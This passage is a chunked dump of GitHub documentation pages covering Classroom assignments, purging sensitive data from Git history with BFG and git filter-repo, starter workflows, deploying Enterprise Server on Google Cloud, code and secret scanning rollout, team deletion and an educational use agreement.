\"assignment-1\" and the student's username on {% data variables.product.product_name %} is @octocat, the name of the assignment repository for @octocat will be `assignment-1-octocat`.\n\n{% data reusables.classroom.assignments-type-a-title %}\n\n\n\nAssigning a deadline for an assi", "Y2h1bmtfMV9pbmRleF8xMjM5": "gnment\n\n{% data reusables.classroom.assignments-guide-assign-a-deadline %}\n\n{% data reusables.classroom.assignments-guide-make-cutoff-date %}\n\n\n\nChoosing a visibility for assignment repositories\n\nThe repositories for an assignment can be public or private. If you use private repositories, only the student can see the feedback you provide. Under \"Repository visibility,\" select a visibility.\n\nWhen you're done, click **Continue**. {% data variables.product.prodname_classroom %} will create the assignment and bring you to the assignment page.\n\n\n\nInviting students to an assignment\n\n{% data reusables.classroom.assignments-guide-invite-students-to-assignment %}\n\nYou can see whether a student has joined the classroom and accepted or submitted an assignment in the **All students** tab for the assignment. {% data reusables.classroom.assignments-to-prevent-submission %}\n\nThe Git & {% data variables.product.company_short %} starter assignment is only available for individual students, not for groups. Once you create the assignment, students can start work on the assignment.\n\n\n\nNext steps\n\n- Make additional assignments customized to your course. For more information, see \"AUTOTITLE,\" \"AUTOTITLE,\" and \"AUTOTITLE.\"\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF82MDI=": "\n\nPurging a file from your repository's history\n\nYou can purge a file from your repository's history using either the `git filter-repo` tool or the BFG Repo-Cleaner open source tool.\n\n{% note %}\n\n **Note:** If sensitive data is located in a file that's identified as a binary file, you'll need to remove the file from the history, as you can't modify it to remove or replace the data.\n\n{% endnote %}\n\n\n\nUsing the BFG\n\nThe BFG Repo-Cleaner is a tool that's built and maintained by the open source community. It provides a faster, simpler alternative to `git filter-repo` for removing unwanted data.\n\nFor example, to remove your file with sensitive data and leave your latest commit untouched, run:\n\n```shell\nbfg --delete-files YOUR-FILE-WITH-SENSITIVE-DATA\n```\n\nTo replace all text listed in `passwords.txt` wherever it can be found in your repository's history, run:\n\n```shell\nbfg --replace-text passwords.txt\n```\n\nAfter the sensitive data is removed, you must force push your changes to {% data variables.product.product_name %}. Force pushing rewrites the repository history, which removes sensitive data from the commit history. If you force push, it may overwrite commits that other people have based their work on.\n\n```shell\ngit push --force\n```\n\nSee the BFG Repo-Cleaner's documentation for full usage and download instructions.\n\n\n\nUsing git filter-repo\n\n{% warning %}\n\n**Warning:** If you run `git filter-repo` after stashing changes, you won't be able to retrieve your changes with other stash commands. Before running `git filter-repo`, we recommend unstashing any changes you've made. To unstash the last set of changes you've stashed, run `git stash show -p | git apply -R`. For more information, see Git Tools - Stashing and Cleaning.\n\n{% endwarning %}\n\nTo illustrate how `git filter-repo` works, we'll show you how to remove your file with sensitive data from the history of your repository and add it to `.gitignore` to ensure that it is not accidentally re-committed.\n\n1. Install the latest release of the git filter-repo tool. You c", "Y2h1bmtfMV9pbmRleF82MDI=": "an install `git-filter-repo` manually or by using a package manager. For example, to install the tool with HomeBrew, use the `brew install` command.\n\n   ```shell\n   brew install git-filter-repo\n   ```\n\n   For more information, see _INSTALL.md_ in the `newren/git-filter-repo` repository.\n\n1. If you don't already have a local copy of your repository with sensitive data in its history, clone the repository to your local computer.\n\n   ```shell\n   $ git clone https://{% data variables.command_line.codeblock %}/YOUR-USERNAME/YOUR-REPOSITORY\n   > Initialized empty Git repository in /Users/YOUR-FILE-PATH/YOUR-REPOSITORY/.git/\n   > remote: Counting objects: 1301, done.\n   > remote: Compressing objects: 100% (769/769), done.\n   > remote: Total 1301 (delta 724), reused 910 (delta 522)\n   > Receiving objects: 100% (1301/1301), 164.39 KiB, done.\n   > Resolving deltas: 100% (724/724), done.\n   ```\n\n1. Navigate into the repository's working directory.\n\n   ```shell\n   cd YOUR-REPOSITORY\n   ```\n\n1. Run the following command, replacing `PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA` with the **path to the file you want to remove, not just its filename**. These arguments will:\n    - Force Git to process, but not check out, the entire history of every branch and tag\n    - Remove the specified file, as well as any empty commits generated as a result\n    - Remove some configurations, such as the remote URL, stored in the _.git/config_ file. You may want to back up this file in advance for restoration later.\n    - **Overwrite your existing tags**\n\n      ```shell\n        $ git filter-repo --invert-paths --path PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA\n        Parsed 197 commits\n        New history written in 0.11 seconds; now repacking/cleaning...\n        Repacking your repo and cleaning out old unneeded objects\n        Enumerating objects: 210, done.\n        Counting objects: 100% (210/210), done.\n        Delta compression using up to 12 threads\n        Compressing objects: 100% (127/127), done.\n        Writing objects: 100% (210/210), done.\n     ", "Y2h1bmtfMl9pbmRleF82MDI=": "   Building bitmaps: 100% (48/48), done.\n        Total 210 (delta 98), reused 144 (delta 75), pack-reused 0\n        Completely finished after 0.64 seconds.\n        ```\n\n   {% note %}\n\n   **Note:** If the file with sensitive data used to exist at any other paths (because it was moved or renamed), you must run this command on those paths, as well.\n\n   {% endnote %}\n\n1. Add your file with sensitive data to `.gitignore` to ensure that you don't accidentally commit it again.\n\n   ```shell\n   $ echo \"YOUR-FILE-WITH-SENSITIVE-DATA\" >> .gitignore\n   $ git add .gitignore\n   $ git commit -m \"Add YOUR-FILE-WITH-SENSITIVE-DATA to .gitignore\"\n   > [main 051452f] Add YOUR-FILE-WITH-SENSITIVE-DATA to .gitignore\n   >  1 files changed, 1 insertions(+), 0 deletions(-)\n   ```\n\n1. Double-check that you've removed everything you wanted to from your repository's history, and that all of your branches are checked out.\n1. The `git filter-repo` tool will automatically remove your configured remotes. Use the `git remote set-url` command to restore your remotes, replacing `OWNER` and `REPO` with your repository details. For more information, see \"AUTOTITLE.\"\n\n   ```shell\n   git remote add origin https://github.com/OWNER/REPOSITORY.git\n   ```\n\n1. Once you're happy with the state of your repository, and you have set the appropriate remote, force-push your local changes to overwrite your repository on {% ifversion ghae %}{% data variables.product.product_name %}{% else %}{% data variables.location.product_location %}{% endif %}, as well as all the branches you've pushed up. A force push is required to remove sensitive data from your commit history.\n\n   ```shell\n   $ git push origin --force --all\n   > Counting objects: 1074, done.\n   > Delta compression using 2 threads.\n   > Compressing objects: 100% (677/677), done.\n   > Writing objects: 100% (1058/1058), 148.85 KiB, done.\n   > Total 1058 (delta 590), reused 602 (delta 378)\n   > To https://{% data variables.command_line.codeblock %}/YOUR-USERNAME/YOUR-REPOSITORY.git\n   >  + 48dc599...051452f m", "Y2h1bmtfM19pbmRleF82MDI=": "ain -> main (forced update)\n   ```\n\n1. In order to remove the sensitive file from your tagged releases, you'll also need to force-push against your Git tags:\n\n   ```shell\n   $ git push origin --force --tags\n   > Counting objects: 321, done.\n   > Delta compression using up to 8 threads.\n   > Compressing objects: 100% (166/166), done.\n   > Writing objects: 100% (321/321), 331.74 KiB | 0 bytes/s, done.\n   > Total 321 (delta 124), reused 269 (delta 108)\n   > To https://{% data variables.command_line.codeblock %}/YOUR-USERNAME/YOUR-REPOSITORY.git\n   >  + 48dc599...051452f main -> main (forced update)\n   ```\n\n\n\nFully removing the data from {% data variables.product.prodname_dotcom %}\n\nAfter using either the BFG tool or `git filter-repo` to remove the sensitive data and pushing your changes to {% data variables.product.product_name %}, you must take a few more steps to fully remove the data from {% data variables.product.product_name %}.\n\n1. Contact {% data variables.contact.contact_support %}, and ask to remove cached views and references to the sensitive data in pull requests on {% data variables.product.product_name %}. Please provide the name of the repository and/or a link to the commit you need removed.{% ifversion ghes %} For more information about how site administrators can remove unreachable Git objects, see \"AUTOTITLE.\"{% endif %}{% ifversion fpt or ghec %}\n\n   {% note %}\n\n   **Note:** {% data variables.contact.github_support %} won't remove non-sensitive data, and will only assist in the removal of sensitive data in cases where we determine that the risk can't be mitigated by rotating affected credentials.\n\n   {% endnote %}{% endif %}\n\n1. Tell your collaborators to rebase, _not_ merge, any branches they created off of your old (tainted) repository history. One merge commit could reintroduce some or all of the tainted history that you just went to the trouble of purging.\n\n1. After some time has passed and you're confident that the BFG tool / `git filter-repo` had no unintended side effects, you can force all ", "Y2h1bmtfNF9pbmRleF82MDI=": "objects in your local repository to be dereferenced and garbage collected with the following commands (using Git 1.8.5 or newer):\n\n   ```shell\n   $ git for-each-ref --format=\"delete %(refname)\" refs/original | git update-ref --stdin\n   $ git reflog expire --expire=now --all\n   $ git gc --prune=now\n   > Counting objects: 2437, done.\n   > Delta compression using up to 4 threads.\n   > Compressing objects: 100% (1378/1378), done.\n   > Writing objects: 100% (2437/2437), done.\n   > Total 2437 (delta 1461), reused 1802 (delta 1048)\n   ```\n\n   {% note %}\n\n   **Note:** You can also achieve this by pushing your filtered history to a new or empty repository and then making a fresh clone from {% data variables.product.product_name %}.\n\n   {% endnote %}\n\n\n\nAvoiding accidental commits in the future\n\n{% ifversion fpt or ghec or ghes %}\nPreventing contributors from making accidental commits can help you prevent sensitive information from being exposed. For more information see \"AUTOTITLE.\"\n{% endif %}\n\nThere are a few simple tricks to avoid committing things you don't want committed:\n\n- Use a visual program like {% data variables.product.prodname_desktop %} or gitk to commit changes. Visual programs generally make it easier to see exactly which files will be added, deleted, and modified with each commit.\n- Avoid the catch-all commands `git add .` and `git commit -a` on the command line\u2014use `git add filename` and `git rm filename` to individually stage files, instead.\n- Use `git add --interactive` to individually review and stage changes within each file.\n- Use `git diff --cached` to review the changes that you have staged for commit. This is the exact diff that `git commit` will produce as long as you don't use the `-a` flag.\n\n\n\nFurther reading\n\n- `git filter-repo` man page\n- Pro Git: Git Tools - Rewriting History\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xODc2": "\n\nAbout deployment environments\n\nFor more information about environments, see \"AUTOTITLE.\" To manage environment secrets, see \"AUTOTITLE.\"\n\n{% data reusables.gated-features.environments %}\n\n\n\n", "Y2h1bmtfMF9pbmRleF8yMTA=": "\n\nOverview\n\n{% data reusables.actions.workflow-organization-templates %}\n\n{% data reusables.actions.starter-workflow-categories %}\n\n\n\nCreating a starter workflow\n\nStarter workflows can be created by users with write access to the organization's `.github` repository. These can then be used by organization members who have permission to create workflows.\n\n{% ifversion fpt %}\nStarter workflows created by users can only be used to create workflows in public repositories. Organizations using {% data variables.product.prodname_ghe_cloud %} can also use starter workflows to create workflows in private repositories. For more information, see the {% data variables.product.prodname_ghe_cloud %} documentation.\n{% endif %}\n\n{% note %}\n\n**Note:** To avoid duplication among starter workflows you can call reusable workflows from within a workflow. This can help make your workflows easier to maintain. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\nThis procedure demonstrates how to create a starter workflow and metadata file. The metadata file describes how the starter workflows will be presented to users when they are creating a new workflow.\n\n1. If it doesn't already exist, create a new public repository named `.github` in your organization.\n1. Create a directory named `workflow-templates`.\n1. Create your new workflow file inside the `workflow-templates` directory.\n\n   If you need to refer to a repository's default branch, you can use the `$default-branch` placeholder. When a workflow is created the placeholder will be automatically replaced with the name of the repository's default branch.\n\n   {% ifversion ghes %}\n   {% note %}\n\n   **Note:** The following values in the `runs-on` key are also treated as placeholders:\n\n   - \"ubuntu-latest\" is replaced with \"[ self-hosted ]\"\n   - \"windows-latest\" is replaced with \"[ self-hosted, windows ]\"\n   - \"macos-latest\" is replaced with \"[ self-hosted, macOS ]\"\n\n   {% endnote %}{% endif %}\n\n   For example, this file named `octo-organization-ci.yml` demonstrates a basic workflow.\n\n ", "Y2h1bmtfMV9pbmRleF8yMTA=": "  ```yaml copy\n   name: Octo Organization CI\n\n   on:\n     push:\n       branches: [ $default-branch ]\n     pull_request:\n       branches: [ $default-branch ]\n\n   jobs:\n     build:\n       runs-on: ubuntu-latest\n\n       steps:\n         - uses: {% data reusables.actions.action-checkout %}\n\n         - name: Run a one-line script\n           run: echo Hello from Octo Organization\n   ```\n\n1. Create a metadata file inside the `workflow-templates` directory. The metadata file must have the same name as the workflow file, but instead of the `.yml` extension, it must be appended with `.properties.json`. For example, this file named `octo-organization-ci.properties.json` contains the metadata for a workflow file named `octo-organization-ci.yml`:\n\n   ```json copy\n   {\n       \"name\": \"Octo Organization Workflow\",\n       \"description\": \"Octo Organization CI starter workflow.\",\n       \"iconName\": \"example-icon\",\n       \"categories\": [\n           \"Go\"\n       ],\n       \"filePatterns\": [\n           \"package.json$\",\n           \"^Dockerfile\",\n           \".*\\\\.md$\"\n       ]\n   }\n   ```\n\n   - `name` - **Required.** The name of the workflow. This is displayed in the list of available workflows.\n   - `description` - **Required.** The description of the workflow. This is displayed in the list of available workflows.\n   - `iconName` - **Optional.** Specifies an icon for the workflow that is displayed in the list of workflows. `iconName` can one of the following types:\n     - An SVG file that is stored in the `workflow-templates` directory. To reference a file, the value must be the file name without the file extension. For example, an SVG file named `example-icon.svg` is referenced as `example-icon`.\n     - An icon from {% data variables.product.prodname_dotcom %}'s set of Octicons. To reference an octicon, the value must be `octicon `. For example, `octicon smiley`.\n   - `categories` - **Optional.** Defines the categories that the workflow is shown under. You can use category names from the following lists:\n     - General category names fr", "Y2h1bmtfMl9pbmRleF8yMTA=": "om the starter-workflows repository.\n     - Linguist languages from the list in the linguist repository.\n     - Supported tech stacks from the list in the starter-workflows repository.\n\n   - `filePatterns` - **Optional.** Allows the workflow to be used if the user's repository has a file in its root directory that matches a defined regular expression.\n\nTo add another starter workflow, add your files to the same `workflow-templates` directory.\n\n\n\nNext steps\n\nTo continue learning about {% data variables.product.prodname_actions %}, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8zNDY=": "\n\nPrerequisites\n\n- {% data reusables.enterprise_installation.software-license %}\n- You must have a Google Cloud Platform account capable of launching Google Compute Engine (GCE) virtual machine (VM) instances. For more information, see the Google Cloud Platform website and the Google Cloud Platform documentation.\n- Most actions needed to launch your instance may also be performed using the Google Cloud Platform Console. However, we recommend installing the gcloud compute command-line tool for initial setup. Examples using the gcloud compute command-line tool are included below. For more information, see the gcloud compute installation and setup guide in the Google documentation.\n\n\n\nHardware considerations\n\n{% data reusables.enterprise_installation.hardware-considerations-all-platforms %}\n\n\n\nDetermining the machine type\n\nBefore launching {% data variables.location.product_location %} on Google Cloud Platform, you'll need to determine the machine type that best fits the needs of your organization. To review the minimum requirements for {% data variables.product.product_name %}, see \"Minimum requirements.\"\n\n{% data reusables.enterprise_installation.warning-on-scaling %}\n\n{% data variables.product.company_short %} recommends a general-purpose, high-memory machine for {% data variables.product.prodname_ghe_server %}. For more information, see \"Machine types\" in the Google Compute Engine documentation.\n\n\n\nSelecting the {% data variables.product.prodname_ghe_server %} image\n\n1. Using the gcloud compute command-line tool, list the public {% data variables.product.prodname_ghe_server %} images:\n\n   ```shell\n   gcloud compute images list --project github-enterprise-public --no-standard-images\n   ```\n\n1. Take note of the image name for the latest GCE image of  {% data variables.product.prodname_ghe_server %}.\n\n\n\nConfiguring the firewall\n\nGCE virtual machines are created as a member of a network, which has a firewall. For the network associated with the {% data variables.product.prodname_ghe_server %} VM, you'll need to conf", "Y2h1bmtfMV9pbmRleF8zNDY=": "igure the firewall to allow the required ports listed in the table below. We recommend opening network ports selectively based on the network services you need to expose for administrative and user purposes. For more information, see \"AUTOTITLE,\" and Firewall Rules Overview in the Google Cloud Platform documentation.\n\n1. Using the gcloud compute command-line tool, create the network. For more information, see gcloud compute networks create in the Google documentation.\n\n   ```shell\n   gcloud compute networks create NETWORK-NAME --subnet-mode auto\n   ```\n\n1. Create a firewall rule for each of the ports in the table below. For more information, see gcloud compute firewall-rules in the Google documentation.\n\n   ```shell\n   $ gcloud compute firewall-rules create RULE-NAME \\\n   --network NETWORK-NAME \\\n   --allow tcp:22,tcp:25,tcp:80,tcp:122,udp:161,tcp:443,udp:1194,tcp:8080,tcp:8443,tcp:9418,icmp\n   ```\n\n   This table identifies the required ports and what each port is used for.\n\n   {% data reusables.enterprise_installation.necessary_ports %}\n\n\n\nAllocating a static IP and assigning it to the VM\n\nIf this is a production appliance, we strongly recommend reserving a static external IP address and assigning it to the {% data variables.product.prodname_ghe_server %} VM. Otherwise, the public IP address of the VM will not be retained after restarts. For more information, see the Google guide Reserving a Static External IP Address.\n\nIn production High Availability configurations, both primary and replica appliances should be assigned separate static IP addresses.\n\n\n\nCreating the {% data variables.product.prodname_ghe_server %} instance\n\nTo create the {% data variables.product.prodname_ghe_server %} instance, you'll need to create a GCE instance with your {% data variables.product.prodname_ghe_server %} image and attach an additional storage volume for your instance data. For more information, see \"Hardware considerations.\"\n\n1. Using the gcloud compute command-line tool, create a data disk to use as an attached storage volume", "Y2h1bmtfMl9pbmRleF8zNDY=": " for your instance data, and configure the size based on your user license count. For more information, see gcloud compute disks create in the Google documentation.\n\n   ```shell\n   gcloud compute disks create DATA-DISK-NAME --size DATA-DISK-SIZE --type DATA-DISK-TYPE --zone ZONE\n   ```\n\n1. Then create an instance using the name of the {% data variables.product.prodname_ghe_server %} image you selected, and attach the data disk. For more information, see gcloud compute instances create in the Google documentation.\n\n   ```shell\n   $ gcloud compute instances create INSTANCE-NAME \\\n   --machine-type n1-standard-8 \\\n   --image GITHUB-ENTERPRISE-IMAGE-NAME \\\n   --disk name=DATA-DISK-NAME \\\n   --metadata serial-port-enable=1 \\\n   --zone ZONE \\\n   --network NETWORK-NAME \\\n   --image-project github-enterprise-public\n   ```\n\n\n\nConfiguring the instance\n\n{% data reusables.enterprise_installation.new-instance-config-summary %}\n\n{% data reusables.enterprise_installation.new-instance-attack-vector-warning %}\n\n{% data reusables.enterprise_installation.copy-the-vm-public-dns-name %}\n{% data reusables.enterprise_installation.upload-a-license-file %}\n{% data reusables.enterprise_installation.save-settings-in-web-based-mgmt-console %} For more information, see \"AUTOTITLE.\"\n{% data reusables.enterprise_installation.instance-will-restart-automatically %}\n{% data reusables.enterprise_installation.visit-your-instance %}\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"{% ifversion ghes %}\n- \"AUTOTITLE\"{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xOTM1": "\n\nAbout blocking users\n\nThe token used to authenticate the call must have the `admin:org` scope in order to make any blocking calls for an organization. Otherwise, the response returns `HTTP 404`.\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xODY3": "---\ntitle: Copilot business\nshortTitle: Copilot business\nintro: 'Use the REST API to manage the {% data variables.product.prodname_copilot_for_business %} subscription for your organization.'\nversions: # DO NOT MANUALLY EDIT. CHANGES WILL BE OVERWRITTEN BY A \ud83e\udd16\n  fpt: '*'\n  ghec: '*'\ntopics:\n  - API\nautogenerated: rest\nallowTitleToDifferFromFilename: true\nredirect_from:\n  - /rest/copilot/copilot-for-business\n---\n\n{% note %}\n\n**Note:** The {% data variables.product.prodname_copilot_for_business %} API endpoints are in public beta and subject to change.\n\n{% endnote %}\n\n\n\n", "Y2h1bmtfMF9pbmRleF8yMTA3": "\n\nAbout sponsoring through Patreon\n\nRather than paying through {% data variables.product.prodname_dotcom %}, you can choose to sponsor eligible maintainers through Patreon on {% data variables.product.prodname_dotcom_the_website %}.\n\nTo sponsor through Patreon on {% data variables.product.prodname_dotcom_the_website %}, both you and the selected maintainer must link your Patreon accounts to your {% data variables.product.prodname_dotcom %} accounts. You can then choose to sponsor maintainers through Patreon on {% data variables.product.prodname_dotcom_the_website %}, or you can sponsor the maintainer directly through the Patreon website while receiving recognition on {% data variables.product.prodname_dotcom %}. For more information on sponsoring through the Patreon website, see Become a patron of a creator in the Patreon documentation.\n\nCurrently, if you sponsor a maintainer through Patreon on {% data variables.product.prodname_dotcom_the_website %}, you can only choose their lowest Patreon tier. However, if you sponsor a maintainer for a higher tier through the Patreon site, you will receive recognition for that sponsorship on {% data variables.product.prodname_dotcom %}.\n\n\n\nLinking your Patreon account to your {% data variables.product.prodname_dotcom %} account\n\n{% data reusables.sponsors.link-patreon-account %}\n\n\n\nSponsoring through Patreon\n\n{% data reusables.sponsors.navigate-to-maintainer-profile %}\n{% data reusables.sponsors.navigate-to-sponsorship-dashboard %}\n{% data reusables.sponsors.sponsor-as-org %}\n1. Under the \"Sponsor as\" section, click **Patreon**, then click **Become a patron** next to the desired sponsorship tier.\n1. On Patreon, select your payment method and fill out your payment information if necessary.\n1. To finalize your sponsorship, click **Subscribe now.**\n\n", "Y2h1bmtfMF9pbmRleF83MTY=": "\n\nPreparing to enable {% data variables.product.prodname_code_scanning %}\n\n{% data reusables.code-scanning.about-code-scanning %} For more information, see \"AUTOTITLE.\"\n\nRolling {% data variables.product.prodname_code_scanning %} out across hundreds of repositories can be difficult, especially when done inefficiently. Following these steps will ensure your rollout is both efficient and successful.{% ifversion default-setup-ghas-enablement %}{% else %} As part of your preparation, you will work with your teams, use automation to collect data about your repositories, and enable {% data variables.product.prodname_code_scanning %}.{% endif %}\n\n{% ifversion ghec %}\n{% data variables.product.prodname_code_scanning_caps %} is also available for all public repositories on {% data variables.product.prodname_dotcom_the_website %} without a license for {% data variables.product.prodname_GH_advanced_security %}.{% endif %}\n\n\n\nPreparing teams for {% data variables.product.prodname_code_scanning %}\n\nFirst, prepare your teams to use {% data variables.product.prodname_code_scanning %}. The more teams that use {% data variables.product.prodname_code_scanning %}, the more data you'll have to drive remediation plans and monitor progress on your rollout.{% ifversion default-setup-ghas-enablement %}\n\nFor an introduction to {% data variables.product.prodname_code_scanning %}, see:\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n{% else %} During this phase, you should focus on leveraging APIs and running internal enablement events.{% endif %}\n\nYour core focus should be preparing as many teams to use {% data variables.product.prodname_code_scanning %} as possible. You can also encourage teams to remediate appropriately, but we recommend prioritizing enablement and use of {% data variables.product.prodname_code_scanning %} over fixing issues during this phase.\n\n{% ifversion default-setup-ghas-enablement %}{% else %}\n\n\n\nCollecting information about your repositories\n\nYou can programmatically gather information about the different programming l", "Y2h1bmtfMV9pbmRleF83MTY=": "anguages used in your repositories and use that data to enable {% data variables.product.prodname_code_scanning %} on all repositories that use the same language, using {% data variables.product.product_name %}'s GraphQL API.\n\n{% note %}\n\n**Note:** To gather this data without manually running the GraphQL queries described in this article, you can use our publicly available tool. For more information, see the \"ghas-enablement tool\" repository.\n\n{% endnote %}\n\nIf you want to gather information from repositories belonging to multiple organizations in your enterprise, you can use the query below to obtain the names of your organizations and then feed those into repository query. Replace OCTO-ENTERPRISE with your enterprise name.\n\n```graphql\nquery {\n  enterprise(slug: \"OCTO-ENTERPRISE\") {\n    organizations(first: 100) {\n      totalCount\n      nodes {\n        name\n      }\n      pageInfo {\n        endCursor\n        hasNextPage\n      }\n    }\n  }\n}\n```\n\nYou can identify which repositories use which languages by collating repositories by language at the organization level. You can modify the sample GraphQL query below, replacing OCTO-ORG with the organization name.\n\n```graphql\nquery {\n  organization(login: \"OCTO-ORG\") {\n    repositories(first: 100) {\n      totalCount\n      nodes {\n        nameWithOwner\n        languages(first: 100) {\n          totalCount\n          nodes {\n            name\n          }\n        }\n      }\n      pageInfo {\n        endCursor\n        hasNextPage\n      }\n    }\n  }\n}\n```\n\nFor more information about running GraphQL queries, see \"AUTOTITLE.\"\n\nThen, convert the data from the GraphQL query into a readable format, such as a table.\n\n| Language                | Number of Repos | Name of Repos                           |\n|-------------------------|-----------------|-----------------------------------------|\n| JavaScript (TypeScript) | 4212            | org/repo org/repo |\n| Python                  | 2012            | org/repo org/repo |\n| Go                      | 983             | org/repo org/repo |\n| Ja", "Y2h1bmtfMl9pbmRleF83MTY=": "va                    | 412             | org/repo org/repo |\n| Swift                   | 111             | org/repo org/repo |\n| Kotlin                  | 82              | org/repo org/repo |\n| C                       | 12              | org/repo org/repo |\n\nYou can filter out the languages that are currently not supported by {% data variables.product.prodname_GH_advanced_security %} from this table.\n\nIf you have repositories with multiple languages, you can format the GraphQL results as shown in the table below. Filter out languages that are not supported, but retain all repositories with at least one supported language. You can enable {% data variables.product.prodname_code_scanning %} on these repositories, and all supported languages will be scanned.\n\n| Language(s)            | Number of Repos | Name of Repos                            |\n|------------------------|-----------------|------------------------------------------|\n| JavaScript/Python/Go   | 16              | org/repo  org/repo |\n| Rust/TypeScript/Python | 12              | org/repo  org/repo |\n\nAn understanding of which repositories are using which languages will help you identify candidate repositories for pilot programs in phase 3, and prepares you to enable {% data variables.product.prodname_code_scanning %} across all repositories, one language at a time, in phase 5.\n\n{% endif %}\n{% ifversion ghes %}\n\n\n\nEnabling {% data variables.product.prodname_code_scanning %} for your appliance\n\nBefore you can proceed with pilot programs and rolling out {% data variables.product.prodname_code_scanning %} across your enterprise, you must first enable {% data variables.product.prodname_code_scanning %} for your appliance. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nPreparing to enable {% data variables.product.prodname_secret_scanning %}\n\n{% note %}\n\n**Note:** When {% data variables.product.prodname_secret_scanning %} detects a secret in repositories owned by organizations that use {% data variables.product.prodname_ghe_cloud %} and have a license", "Y2h1bmtfM19pbmRleF83MTY=": " for {% data variables.product.prodname_GH_advanced_security %}, {% data variables.product.prodname_dotcom %} alerts all users with access to security alerts for the repository. {% ifversion ghec %}\n\nSecrets found in public repositories using {% data variables.secret-scanning.partner_alerts %} are reported directly to the partner, without creating an alert on {% data variables.product.product_name %}. For details about the supported partner patterns, see \"AUTOTITLE.\"{% endif %}\n\n{% endnote %}\n\nIf a project communicates with an external service, it might use a token or private key for authentication. If you check a secret into a repository, anyone who has read access to the repository can use the secret to access the external service with your privileges. {% data variables.product.prodname_secret_scanning_caps %} will scan your entire Git history on all branches present in your {% data variables.product.prodname_dotcom %} repositories for secrets and alert you{% ifversion secret-scanning-push-protection %} or block the push containing the secret{% endif %}. For more information, see \"AUTOTITLE.\"\n\n{% ifversion ghec %}{% data variables.secret-scanning.partner_alerts_caps %} runs automatically on public repositories and public npm packages to notify service providers about leaked secrets on {% data variables.product.prodname_dotcom_the_website %}.\n\n{% data variables.secret-scanning.user_alerts_caps %} are available for free on all public repositories.{% endif %}\n\n\n\nConsiderations when enabling {% data variables.product.prodname_secret_scanning %}\n\n{% ifversion default-setup-ghas-enablement %}Enabling{% else %}{% data variables.product.product_name %}\u2019s {% data variables.product.prodname_secret_scanning %} capability is slightly different from {% data variables.product.prodname_code_scanning %} since it requires no specific configuration per programming language or per repository and less configuration overall to get started. This means enabling{% endif %} {% data variables.product.prodname_secret_scanning %} at the o", "Y2h1bmtfNF9pbmRleF83MTY=": "rganizational level can be easy, but clicking **Enable All** at the organization level and selecting the option **Automatically enable {% data variables.product.prodname_secret_scanning %} for every new repository** has some downstream effects that you should be aware of:\n\n\n\nLicense consumption\n\nEnabling {% data variables.product.prodname_secret_scanning %} for all repositories will consume all your licenses, even if no one is using code scanning. This is fine unless you plan to increase the number of active developers in your organization. If the number of active developers is likely to increase in the coming months, you may exceed your license limit and then be unable to use {% data variables.product.prodname_GH_advanced_security %} on newly created repositories.\n\n\n\nInitial high volume of detected secrets\n\nIf you are enabling {% data variables.product.prodname_secret_scanning %} on a large organization, be prepared to see a high number of secrets found. Sometimes this comes as a shock to organizations and the alarm is raised. If you would like to turn on {% data variables.product.prodname_secret_scanning %} across all repositories at once, plan for how you will respond to multiple alerts across the organization.\n\n{% data variables.product.prodname_secret_scanning_caps %} can be enabled for individual repositories. For more information, see \"AUTOTITLE.\" {% data variables.product.prodname_secret_scanning_caps %} can also be enabled for all repositories in your organization, as described above. For more information on enabling for all repositories, see \"AUTOTITLE.\"\n\n\n\nCustom patterns for {% data variables.product.prodname_secret_scanning %}\n\n{% ifversion ghae %}\n{% note %}\n\n**Note:** Custom patterns for {% data variables.product.prodname_secret_scanning %} is currently in beta and is subject to change.\n\n{% endnote %}\n{% endif %}\n\n{% data variables.product.prodname_secret_scanning_caps %} detects a large number of default patterns but can also be configured to detect custom patterns, such as secret formats unique t", "Y2h1bmtfNV9pbmRleF83MTY=": "o your infrastructure or used by integrators that {% data variables.product.product_name %}'s {% data variables.product.prodname_secret_scanning %} does not currently detect. For more information about supported secrets for partner patterns, see \"AUTOTITLE.\"\n\nAs you audit your repositories and speak to security and developer teams, build a list of the secret types that you will later use to configure custom patterns for {% data variables.product.prodname_secret_scanning %}. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\nFor the next article in this series, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjA4": "---\ntitle: Deleting a team\nintro: Organization owners can delete teams at any time from the team's settings page.\nredirect_from:\n  - /articles/deleting-a-team\n  - /github/setting-up-and-managing-organizations-and-teams/deleting-a-team\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\ntopics:\n  - Organizations\n  - Teams\n---\n\n{% tip %}\n\n**Tip:** Only organization owners can delete parent teams. For more information, see \"AUTOTITLE.\"\n\n{% endtip %}\n\n{% data reusables.profile.access_org %}\n{% data reusables.user-settings.access_org %}\n{% data reusables.organizations.teams %}\n1. Select the team or teams you'd like to delete.\n\n   !Screenshot of the first two teams in the list of teams. To the left of each team, a checkbox is checked and outlined in dark orange.\n1. Above the list of teams, select the **X teams selected** dropdown menu and click **Delete**.\n\n   {% data reusables.organizations.bulk-edit-team-dropdown %}\n1. Review the team or teams that will be deleted, then click **I understand, delete teams**.\n\n", "Y2h1bmtfMF9pbmRleF8yMDQ2": "\n\nEDUCATIONAL USE AGREEMENT\n\nThis EDUCATIONAL USE AGREEMENT (this \"Agreement\") is a legal agreement between you (\"Education Partner\", \u201cyou\u201d, or \"your\") and GitHub, Inc. (\u201cGitHub\u201d, \u201cwe\u201d, or \u201cus\u201d).  This Agreement sets forth the terms and conditions under which Education Partner may participate in GitHub\u2019s Education Partner Program and receive Program benefits as defined herein.\n\nIf you are entering into this Agreement on behalf of an organization or other legal entity, you represent that you have the legal authority to do so.\n\nWhen you click \"I agree\", \u201cI accept\u201d, or similar buttons, you accept all the terms and conditions of this Agreement.\n\nAs an educational institution, you\u2019d like to allow Qualified Users to use and access GitHub products listed on an Order Form solely for their non-commercial, academic use. 